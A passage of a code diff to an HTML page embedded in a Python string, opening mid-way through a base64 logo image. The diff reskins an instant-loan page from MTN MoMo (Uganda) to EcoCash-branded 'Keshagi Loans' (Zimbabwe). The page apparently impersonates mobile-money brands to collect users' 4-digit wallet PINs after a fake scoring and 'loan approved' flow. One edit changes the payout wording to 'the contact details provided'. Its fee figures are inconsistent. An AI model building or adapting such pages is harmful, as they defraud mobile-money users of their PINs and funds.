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" alt="MTN Logo" class="h-8 w-auto"><button onclick="toggleMenu(false)" class="p-1 rounded-md text-slate-500 hover:bg-slate-100">
-            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
+           <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
           </button>
         </div>
         <nav class="mt-6 flex flex-col space-y-1">
@@ -224,7 +223,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
   <!-- MAIN WRAPPER -->
   <main class="w-full max-w-[760px] mx-auto px-4 py-2 flex-1">
 
-    <!-- SCREEN 1: HOME --><section id="screen-home" class="space-y-4"><div class="text-center"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUAAAAFACAMAAAD6TlWYAAAA4VBMVEUAT3H////+ygoATXIAT3DqwBEtZV4DUG/+yQolaYYMV3j4+vsLU2wGUW4EUnMrbYkRV2n0xQ3C1d0XWWe7qSQfXWQiX2Pwww4OVWpllalLg5vo7/IUXXxLc1EoYmBtmq47eJLXtxlEb1RhfUnPsxzS4OZxhUKjnS7ivBSOscBXeUyow89Xi6G6z9mYmDJHgJmCjjv+/PJlf0c3aVrHrx95iT6Okzb99NK0pieWlzN+preLkjf96Jr80Cv866dthEP97rb9437810v++ef832/821398cT97K5XiZfp02784HQCoxS8AAAW4klEQVR4nO2deXsaORLGm+62OW3M5Qsf4Ats8I0T4oQ4cZxkZr7/B1qpwUC3bqnUh5d3/9hndxIbflNSHSqVnNxKRnKS/gBZ1wqgoVYADbUCaKgVQEOtABpqBdBQK4CGWgE01AqgoVYADbUCaKgVQEOtABpqBdBQ6QJYbp/XB5fPe8PbarF4UCptOkibpdJBsVi9He49Xw7q5+1y0p8ypJQAROSuL4+HnerBQQCNpc2Dg2pneHx5nRqOyQMst+uXx/tVPjgSZHX/eFBPAcVkAZbPB8f7xZIKumWVivvPg/NkISYHEMPrqNkd3RY7x0lCTAhg+/r51hzeAuLt83U7mW+SBMD2YK+qvWxZKlX3BkkwjB1gezAsgpleWJvFYfwM4wXYvt6zRe+d4V7MazlGgOX6M/zKJVWqPtdj9CmxAWwP9g/s05vqYD++pRwTwPPnqtWlG9Vm9fk8nm8WB8Byfa8YJ72pinuxrGT7AMvXw9jWblgHw2v7CG0DLA/2Y3AcLJX2B7YR2gVYHtwmiC9AeGsZoU2A5eskrW+OcN/qQrYIsD5MAT6s0rBu71taA3h+nJDroOng2FpQYwlg+zKBwIWn4qWl0NoKwPJ1J9awWUabHTtboQ2A53sp2fzCKu3ZWMfwAMtpW70LFS/hjRAcYH2YutW70OYQ3AiBAcZnfn7wH2WBGyEswPMYza/ysu1pEIQ2QkiA5UF8u5/vHdZ6Wzo26BRBkztAgO0Yna/vNEau+3VDi2DpGDAmhANY70BT4urJdd3ai+Zf7sDldlAAy5dxZm6+d9RHAN21Q0/vB8D5EiCA7eN4Y+f8jRuou67jSBzAZQwD8PwWGBBfvneyMwXojhta2yDSLYw3BgF4XYUFJJDvbDXdd2k6EqTqNcR3BwAY7/aH5b3M+bm1U81t0HEOIDZCc4Dl55hLB7633V0AdPuPmtsg2gifzQkaA2zvxZ77+p+W+BXcpvY26GzuGbsSU4DtfVA2EkIeZM0N6S6v/9P2TQkaAjzvgIGR1u44zM/d0Y0GsTqGztgMYD1e9xvIO61FALpnWmWFmapmWYkRwAT4+U7rLMrPdW82DH6kGUETgPUkSs/+HcnPrV0ZLGKnaELQAOB1Avx877FPAeh2TRaxUzQIqfUBJsHPcSo9FLhQZLSITQhqA0xm/XpXhAeZL2IDEzRYxboAk+EXlFHpGrW0w2ksbYKaAJOIX7CeWPxQOG3CT98X6wE8T4Sf761TPchUa/o5caCqXkStBbDdAUKiqI0em1/BHVfMfvqtVlanAzD+/DcQPohjAzQqbE011CGoAbC8BwNEUciDNHn8UEZn5kccZ0+juqUOsPycUO+Gd0GNAJf0ZPgbNjXqg+oAL5NpvfK9o66An9vXPWJ6V+nSPsDrpBpP819E/Fz3i0FlMNCBckqiCjCZACZ0EMeRaSijEcwoAmzHe365JKKMSlHB7RmlxFiqwYwawPIxBAuKhHbjPYj5Ie2cmJqgc6zmSNQAWnEgvrNV8fgIIwdxHPUMo2llR6IEsG7DgaD4btxbFxih/1WOn1szN0G1uoIKQFsZ3BMKQJ4aPCMkDuLYMk3okDoq26ACQDsZSFBjRhHy6HCDnYl5J5wqQlgAu6DSNqgAcGBnA0TuNcgwdr5sc4zwRHIPdAEcsVMa2AB4bqeE6j3MKwRnVywj9B1vnVlKtWCCRfloUBpgeWj6qWjyvfUl06rdsI3Q2xaUEmYquDem6QjSUHoRSwO8tFNCqIRLfGeHeQZB32tJhNJYxhkx0qZ0LCML0NIZCHFItPOV5Y59r8Gppy7rDuCDSccykgBtLeBtss2g+ciICaUJdlsAn012EUsCtLSAqRWW/kPFkOCLYWkaS3YRywG044F975BSYSm4tS+MZYwISu2Doy2ATyfpiaUAWgqh2ae8zUcWQSlPUjs0dyOyBX4pgNd2itDUPqGp+ld0b+zLRDMFtwcQyTglqeKqDEA7OTDZabqMYOdul2pFvnckEVH3jwB2QbmcWAbgJcCHIRS6q0BTr0WFEA69WXqCAOjI+BEJgJZyOOdJcMjWXKdvhDKVhdEuxCeU8SMSAK1UoVmNfsvqntAjQu9KWNwCKAtiHUMAtFRFrYzpjX4LFdz+Kc2VoP/ngduigPUJ5GMeiPMRIUA7OchyEYajnSdaTO07ebb/ngkkG5HJR4QArYQwMqfkgWqfaM7Yj9YgKH/RrOHyXeJQRgSwbKeRiNdnFVKh16AR9ER9MjChoOPsi0xQBNBKGZoswnA0blEJioKZ7jZIJCMsTgsAlm0cpKOEjHLXg6kmFYV3KHDFpyBrWGiCAoB2DDD/if/dIxqtU43phW/FQGtYZIJ8gFZ2QHoRRpUgciT8biMgPywyQT5AGy6Y12rP0tkjjSByJJxQEsgPixwxF6ClOrQwiJMkyE1mCu4NCD9RLMgFaCMJ4RVhFAnSLm4u/5UGzCfmpyNcgBbqqL6zJXm4FsVB7oO+s8HzRigfhvnMe7oA7ZRhLrT4BQSja1KwDd4BAeQWZXgAn2F+/7L4d2X4Gh2RBLnbYNO8z2iqZz2AbfhuXp9521JGTdqdVk40CFOXRqpyStMcgAMLR5n8bV+kMZEXc8sKBaNr2Eva5ATTbIAWgmj5RlOGyImB3B/5BeqDcyIZNkAbMczGjRE/hISsD3IKEzCFfYcbybABWnAhKkUYhu7IGvUGM6VboyfRGmK7ESZAeBeiWIShq/YQPSehNtjMZHr9cC62G2ECtJAG5/md4oWdfrfb7a/xrZQyc5Ft2GCbIDshZgIEz0K4d40K/fHd1eNRq9FoHZ2cfm3i6I4R7nTJ20jMrXUEFQmysxEWwDZ0FsIswiBOa+PT7YqHhP8g/u/K0cN4h46w4I6i4SDbE4NFgk6RtYZZAC0Egax5B2s3jxte5Isihic9lsGSwQwrvKyZTNUKiRkKsgBCF7IYSVfBrY0f85QOBN/xNk5YB0fk1EpWggPT4oE1VAMIvYIXtxki6j+wrnkhhFtP9MpX7TT6Z1kpNlBd32GvYQZA+BX8Qv2CI0YjYCD0D07oEUqf7NygbxBQNUH2GmYABPbBLAsZt7i3DJERHtGX8Shy1slyUXChNMsP0wGCR9H0lJ96aB4Wq6GyF8npWCM9oOoJzFiaDhA6iqZ7SbK4QgqFKCPa5lm7iP5JerMDnBdhxNJ0gLB5MCNOI+I5xl+m9yCsRbZBxi7RAzpZclj5MBUgdD8CNVOIEmCKkalFt0HHoZ32gRVkHOeWWtOiAjwHrWQxZtbJDnnxWY0MX8LRIH04aB+mRQbrgHo0QgU4gPqdWOiL0RzkSHr6MytTI0Y90eYq1GjHoZqiBjJUgLBNvdTr+kp9A94LNc0gnnKgta3DuWF6wy8NYLkD9juZB+lqN/MZdYhILEMNZeDcsNOhbYI0gJBbIGNkmGLjikc/TMbV1ZAq5KE9VIOHw9gEaQBh8zhqjqWYYnnb9FQ3cjWYVnIEOxxmZHM0gIBbIOvk+6viz8kzDi+jCckGUZWBy4bpmyAFIGAUyCrCqN4G9L1TOsDagxf+c4/RDRcwjqG2ClIAQpayPHoRRrn50VtntHRFJ3DnozE7ZBxDK2lRANbBEmFmK/hYeTTJFqspMzyBm2KCgHFMiXI8TAEIeLeQ1Xehfo+ItQnitzD4Jghxff1dlNuHFIBwPoTZCXOh/KU85pFoOKUhTRCqyQ2L4kVIgGA9MZwTb/VlxYgEsSJJNTLBkNu6Afo6WBQvQgKEK6Yyh3ZqHJZx5gf2Q32DhAmOwY5FqEVVEiBUHsK5zaDRfMuKYwIbCyOKxIJwh+vUXIQEeA2Th/BuM+hYIAdgeFpWNB2BjKQ3yao0CRDKCXNuM2h0PjICyqkilYlwRtwHunATiHTDJEAYJ8y/zfCgDpB3uSRcmogUcNfA2jscmhsmAYL0JAhGSqiHFj73fuwovExDUfcOYCpC6U8gAEIVA7kjJdQbBir862Fhkw65bLDrIlhkSZAACBLFiEZKKG/srHoW4we2locSgjUYObQ4hgAIEcUwO2HepbqsRC9hELnN8o4JmAxT4hgCIMiZunCkhHKhXXTD+GzZ14bPiNU9FltktzkBEKAcLTFSoql4XNsQdleHTXC59qCeeLNFFqUJgBBhoHCmhuKkWPZraAtFTHBpyQMeK1ECQQIgQBgo/rqqk2Iph0WEwmWrpUgGshxD9ncQAI0b23jXDhZSebhC7EKwwrHgUvXmKyRAosmNAGhezJIZKVFQeDVAOOdtptCYDu9o7kZgpkDNRETSBMCO4W+QHSmh8CArNw9eKOyYFm4E7LIIVkcI0DCOlh8pIfuqssyct+m/kuXi/tKyBwVYFQI0PZKTHynR25VpLwqmPMldMQ5P0Z//i4QsSTtFIUCzRERlpEThjritQPmBTkX6hmfYMc3rN1kCKLvfT1V7EhJE/GSfYnEj7mJe2gcFeCAEaJjJieZ6RggyRm6/y/d2VaZEdbeX//J78AgKsCQEaJLJKY+UYI7cnv44x2v1lCYshNLed+cN6kQ2hQANfrjOSAnm5PzgB54oDokKRTLvoWB2AErO9QwreE2J/tNad6ozjsIp9uziwyfITITkBQdQeq7nsgpuYXTaiF7WxNc1Gw9nzDvDTH0KfZ7pSR5oKmcToEQRhq7a6GK94i0g4gvD609a4wFCbV+zMjZoMcEmQG+92VccDDhXf/x0sr1Vyft+vtI4Orxr6gwowwolxNN0DrScZdUC87utx8OLm2Z3R2c4Ua1/1uwhNc/6BrM9lrOR2RqGbM+ScCL6YQz+V48XYqXxeHU3PlvTHvFkotAl/+kaBhvdgSUGCHIk4nn5xjqeHWE8J0ZZIXvbGAMOgAokDqTBrjhgW9w+fBp344UYavPAsTToubBEKgd6TQ6Z4kYLuYR+fMs5dMUat1ZDNknLAIQfuoinmJzenMVliKE1XGlCXlp3ZKoxVp4A9zy/cXI30g1ylBRqYPfu3D79YRdNiQuqHcDftpCPIe4+PmnHd/IK++GTWhewP1CmpG/n8YGp0GJGDLEd2twTQ7F0owvZoeo4+0KAVl5AWwgzvBtZ3Q9DrV9+D7JHWuZY09Yz9At53tbJl649G1zOh33vAbSaJXGwbuUJr6g8vxVMF7OiUODnrYMmIhKtHTZGzxLCPqXy+BWboQVLDJVfKpAt0jLNRZZeMSTkO57Temja2A2Xrwj7nIK3hiTa22AndvAUmOFJT3swN1NwUwMJSTRYWhi/zRYyw/z6ndloZIpAywchSbT4gk6cECtYyRfKD4zwBdpOFJJEkzn46EWRfHz+cQoaGsLGzsuSuOYQQyBIkbd1BehP7G2CMhdtYgkEo0JmuAuHEPRmQ0gyV72ALhuqChQh7EHcQlKXDeOLYyIKEMLsheozGeQkdd011jgmLDx39nQEkJvAlrAWkrpwbek1TTkhhI0L87gQ9ILhkqSu/Cfjhpfkbd8ZZyewFYS5pIZOJOOGF8Kh9TpzirmkYPth5pIbewI3eEdT3CnmcrLjRSQH74C/Q6Au7E0euga1LshBCQtJjn6y8iSuqhDC7U/6J1CwZ5nvoo2htTz+zkSef6L3CKJrKxeRHH8HO4NWXziwftENaUBbsmaSHsCYWC4SFZ6l39NLTWxUtKRHgMZcEuQI++MrrVZVG25YeghtWjZBLHzV4ZNGUDjagv8s0mOQ07IJzuTlD9Ur1qDzimaSH8Sdmk0wkJYRWsiGFUbBpyISXJLv5A8Vd0ILcYzCYwQ2noU0EjbCL2ruGHLYyVQKz2HEdrouL9/bOFWKCcGL0koPsiRYVGUJx4RjhewYtqfIUXwSyHaTm45wYsJ4Jo0m2K42R/FRqnhajFSFn0mTDmgAZ+gHUnwWLQUlLYqwL7mpyS3jM+BIWvFhvtj7EyTle5UXuXq/8rR5gRSfhkznGnYUljFwd4Ly46TpXMPObA6ABMAd2JKq8vO4afTDM6Fl/LQj3Ahhb3ipP9Ccwlh6Lt/xD4VBNWwup/FEeApj6bl8fLlbABD2kqbGI/Wpy4fD8hqigUagZ+v0PJgPsJ6qmlZU4o0Q8lSE7C2XAJhoj4xYaCO84kaEkKNTaY8pCQGmNhScif3+9VSAsyaYQSAfYJrdCBb7/etAgPUstgvhAky5G8HyGuyYGhAg24XwAabraIQm39v9yipUwzVoFamHIRIAU5yNvMt3Ni4Y501wI7OYWYgQYLojmUDIGZ/2qeEMWG8CJ4YRASyntKi1LOSM6XkdGMAhO4YRAUxzQjwXcsbUcAZqCbPTYAmAKQ+mp8KZMaVECOVEOEG0GGBukAETdBxqQAgEsMQJoiUApq1HgSHf2yZ6MYHiQHo/gjTArJig77WiBGEAigxQCDATu6ATDDyPJCUwubBgBxQDzIQjxiIIgpSzBC5YBmAWYsFAvrcVIgjSXcSPAaUAZiEdmSpCEKIizU9CJAGmqeGXrzBBiEMlalOvMsDztB4RE1omCHGsyS3DyANM+vahgpY8CcTgSsrdQi2A7Y75V4tJiOAsHgS47NXhFKKVAGYlmsaaR9T9bVOA4hBGGmA5/ZXVuVBWF1QWzG/97wlDGGmAGfIjwZsII7dgftNGxoNIA8xdpvuIMyzvsWveobop40HkAWYlJZ7KO+lrvAEdljgHUQKYq2doESNd1Qy79IviHEQNYKYWse/4F2bFGNkFrAAwM0UFLN+pmDlh2QWsADBTnth08qekB1YDmKVw2lDCMrQewCyF02aSC6GVAWYpJzaSVA6sAzA7tVUjSVRRdQHmLv8PtsGSdASjAbCcmeq0vo4VNkBlgLl2Ng7aDXSrsgGqA8ydp7zv11RV+QhQD2Du+kM7kgOpIqoRwA/tSBQdiB7A8nOGygpq2nxWcyB6AD9wRqKSgRgAzLUzVV2V176iA9YG+EFzOqUMzgzghwxmlAMYE4C5+ocjWFXKgI0BZu2MRCjpMxAogLnrD0VQm58+wA9FsKicgAAA/EAEDfiZAPwwBPXXryHAD+KLdf0vAMAPQdCMnyHA3HkHv6OeYTkdvfgZCmCu/c96pvWPVv4GCDB3/+9ahvXvven3NwaYu/9JXjXNin4a8wMAmLv/NkkahJ4m38z5QQDM5X5kkuDkB8R3BwGY+/xq78l0Syq8fgb56jAAc7/ekgaiqrdfMN8cCGDWNkKQ7S8QFMBc7k92lnHh9Q/Y14YDmKFlDLV8sQAB5u6/Z2IZT75DLV8sSIDIG/9Omo5Yv2G877tgAabfl8B5j5mAAeKQMGlGPAGbX84CwDQbIbj55WwATO9OCG9+OTsAc/d/0xcTFl7/wptfzhJAFBOmbB0XJt8AY79lWQKI1vGb3qOYVlR7s7F6A1kDiHK71GyFv+EyN0IWAebuf7wmjQ7r9YeVzW8mmwADb5I4Pju+Yy67ABNHaBuffYB4ISe2F/62uninsg8QIfzzNok9LixM3v7YxxcPQKTPP2OOCyc/rQUuYcUEEIXW319rMZlhofb63VLYTCo2gGglx2SGyPjiWLszxQgQ6dffN8sMJ29/YzO+QPECzOGl/Nsaw8nv+Jbuu2IHmMMMbdjh5C1+erlkACL9+vHzFS60KUxef/5Igl4uMYA57FO+vwE4ZgTv7XucXiOi5ABiIYj/vU7k3/2OsHMnr/8lCQ8rWYBY97/+fEMUJd9dfkdXQ+y+/fmVLDys5AEGuv/1+ce3/36/Tibcd+jRP5pMXn//9+3H5xSwC5QSgDNhjt8xSEQy5KjR/3zF4L6nh9xM6QKYQa0AGmoF0FArgIZaATTUCqChVgANtQJoqBVAQ60AGmoF0FArgIZaATTUCqChVgANtQJoqP8BQuN1qmltLBwAAAAASUVORK5CYII=" alt="MTN Logo" class="h-20 w-auto mx-auto mb-4"><h2 class="text-xs tracking-widest font-bold text-[#004F71] uppercase">Uganda • Mobile Money</h2><h1 class="text-3xl sm:text-4xl font-extrabold text-[#004F71] mt-1 tracking-tight uppercase">MoMo Loans</h1><p class="text-slate-600 text-sm mt-1">Instant, flexible financial relief straight to your MTN wallet.</p>
+    <!-- SCREEN 1: HOME --><section id="screen-home" class="space-y-4"><div class="text-center"><img src="/assets/logo.jpg" alt="EcoCash SuperApp" class="h-20 w-auto mx-auto mb-4">    <h2 class="text-xs tracking-widest font-bold text-[#004F71] uppercase">Zimbabwe • Digital Loans</h2><h1 class="text-3xl sm:text-4xl font-extrabold text-[#004F71] mt-1 tracking-tight uppercase">Keshagi Loans</h1><p class="text-slate-600 text-sm mt-1">Instant, flexible financial relief delivered to your EcoCash.</p>
       </div>
 
       <!-- 4 Benefits -->
@@ -252,7 +251,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <div class="absolute -right-10 -bottom-10 w-44 h-44 rounded-full bg-[#FFCC00]/10 blur-xl pointer-events-none"></div>
         <div class="relative z-10 space-y-3">
           <span class="inline-block bg-[#FFCC00] text-[#004F71] px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider">Fast Mobile Access</span>
-          <h3 class="text-2xl sm:text-3xl font-black leading-tight">Loans Up To UGX 1,000,000 INSTANTLY!</h3>
+          <h3 class="text-2xl sm:text-3xl font-black leading-tight">Loans Up To ZWG 500,000 INSTANTLY!</h3>
           <p class="text-blue-100 text-sm max-w-md">No paperwork, no standing in lines. Apply directly from your phone in under 2 minutes.</p>
         </div>
       </div>
@@ -321,8 +320,8 @@ HTML_PAGE = r"""<!DOCTYPE html>
       </div>
       
       <div>
-        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Loan Amount (UGX)</label>
-        <input id="input-amount" type="number" placeholder="e.g. 2500" min="50000" max="1000000" step="50000" oninput="syncAmount(this.value, true)" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
+        <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1">Loan Amount (ZWG)</label>
+        <input id="input-amount" type="number" placeholder="e.g. 2500" min="500" max="500000" step="500" oninput="syncAmount(this.value, true)" required class="w-full px-4 py-3  border border-slate-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-semibold">
       </div>
 
     </div>
@@ -348,11 +347,11 @@ HTML_PAGE = r"""<!DOCTYPE html>
       <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-sm space-y-6">
         <div class="text-center">
           <div class="text-xs font-bold text-slate-400 uppercase tracking-wider">Requested Amount</div>
-          <div id="display-amount" class="text-4xl font-black text-[#004F71] mt-1">UGX 500,000</div>
-          <input type="range" id="amount-slider" min="50000" max="1000000" step="50000" value="500000" oninput="syncAmount(this.value)" class="w-full mt-4 accent-[#FFCC00]">
+          <div id="display-amount" class="text-4xl font-black text-[#004F71] mt-1">ZWG 500,000</div>
+          <input type="range" id="amount-slider" min="500" max="500000" step="500" value="5000" oninput="syncAmount(this.value)" class="w-full mt-4 accent-[#FFCC00]">
           <div class="flex justify-between text-xs text-slate-400 mt-1 font-semibold">
-            <span>UGX 50,000</span>
-            <span>UGX 1,000,000</span>
+            <span>ZWG 500</span>
+            <span>ZWG 500,000</span>
           </div>
         </div>
 
@@ -377,11 +376,11 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <div class="border-t border-slate-100 pt-4 space-y-2.5 text-sm">
           <div class="flex justify-between text-slate-600">
             <span>Interest (5%)</span>
-            <span id="breakdown-interest" class="font-bold text-slate-800">UGX 50</span>
+            <span id="breakdown-interest" class="font-bold text-slate-800">ZWG 50</span>
           </div>
           <div class="flex justify-between text-slate-600">
             <span>Admin & Processing Fee (3%)</span>
-            <span id="breakdown-fee" class="font-bold text-slate-800">UGX 30</span>
+            <span id="breakdown-fee" class="font-bold text-slate-800">ZWG 30</span>
           </div>
           <div class="flex justify-between text-slate-600">
             <span>Repayment Due Date</span>
@@ -389,7 +388,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
           </div>
           <div class="flex justify-between text-base font-extrabold text-[#004F71] pt-2 border-t border-slate-100">
             <span>Total Repayment</span>
-            <span id="breakdown-total" class="text-[#004F71]">UGX 1,080</span>
+            <span id="breakdown-total" class="text-[#004F71]">ZWG 1,080</span>
           </div>
         </div>
       </div>
@@ -423,7 +422,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
           <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Loan Summary</h3>
           <div class="bg-slate-50 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
             <div class="flex justify-between"><span class="text-slate-500">Purpose</span><span id="review-purpose" class="font-bold text-slate-800">Business</span></div>
-            <div class="flex justify-between"><span class="text-slate-500">Principal</span><span id="review-principal" class="font-bold text-slate-800">UGX 100,000</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">Principal</span><span id="review-principal" class="font-bold text-slate-800">ZWG 100,000</span></div>
             <div class="flex justify-between"><span class="text-slate-500">Period</span><span id="review-period" class="font-bold text-slate-800">30 Days</span></div>
           </div>
         </div>
@@ -431,14 +430,14 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <div>
           <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Repayment</h3>
           <div class="bg-blue-50/70 border border-blue-100 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
-            <div class="flex justify-between"><span class="text-slate-600">Total Payable</span><span id="review-total" class="font-extrabold text-blue-800">UGX 1,080</span></div>
+            <div class="flex justify-between"><span class="text-slate-600">Total Payable</span><span id="review-total" class="font-extrabold text-blue-800">ZWG 1,080</span></div>
             <div class="flex justify-between"><span class="text-slate-600">Due Date</span><span id="review-date" class="font-bold text-slate-800">30/09/2026</span></div>
           </div>
         </div>
 
         <label class="flex items-start gap-3 pt-2 cursor-pointer">
           <input type="checkbox" id="confirm-check" onchange="toggleConfirm(this.checked)" class="mt-1 h-4 w-4 rounded accent-[#FFCC00]">
-          <span class="text-xs text-slate-600 leading-snug">I confirm that the information provided is correct and agree to MTN MoMo loan terms and conditions.</span>
+          <span class="text-xs text-slate-600 leading-snug">I confirm that the information provided is correct and agree to Keshagi loan terms and conditions.</span>
         </label>
       </div>
 
@@ -452,7 +451,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       <div class="text-center pt-2">
         <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-2xl mb-3">🔒</div>
         <h2 class="text-2xl font-black text-[#004F71]">ENTER YOUR PIN</h2>
-        <p class="text-xs text-slate-500 mt-1">Please enter your 4-digit MTN MoMo PIN to authorize</p>
+        <p class="text-xs text-slate-500 mt-1">Please enter your 4-digit EcoCash PIN to authorize</p>
       </div>
 
       <!-- PIN Indicator Dots -->
@@ -512,7 +511,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
       <div>
         <h2 class="text-2xl font-black text-[#004F71]">PROCESSING APPLICATION</h2>
-        <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Please wait while our automated scoring engine reviews your MTN MoMo history.</p>
+        <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Please wait while our automated scoring engine reviews your Keshagi application.</p>
       </div>
 
       <div class="max-w-[320px] mx-auto bg-white rounded-2xl border border-slate-200 p-4 space-y-3 text-left text-xs font-semibold">
@@ -538,7 +537,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
           ✓
         </div>
         <h2 class="text-2xl sm:text-3xl font-black text-[#004F71]">LOAN APPROVED!</h2>
-        <p class="text-xs text-slate-500 mt-1">Funds will be credited to your MTN MoMo wallet.</p>
+        <p class="text-xs text-slate-500 mt-1">Funds will be disbursed through the contact details provided.</p>
       </div>
 
       <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-4">
@@ -548,11 +547,11 @@ HTML_PAGE = r"""<!DOCTYPE html>
         </div>
         <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
           <span class="text-slate-500">Approved Amount</span>
-          <span id="approved-amount" class="text-lg font-black text-[#004F71]">UGX 100,000</span>
+          <span id="approved-amount" class="text-lg font-black text-[#004F71]">ZWG 100,000</span>
         </div>
         <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
           <span class="text-slate-500">Repayment Amount</span>
-          <span id="approved-repay" class="font-bold text-slate-800">UGX 1,080</span>
+          <span id="approved-repay" class="font-bold text-slate-800">ZWG 1,080</span>
         </div>
         <div class="flex justify-between items-center text-xs sm:text-sm">
           <span class="text-slate-500">Repayment Date</span>
@@ -589,10 +588,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
       </div>
 
       <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-3 text-xs sm:text-sm">
-        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Principal</span><span id="details-principal" class="font-bold text-slate-800">UGX 100,000</span></div>
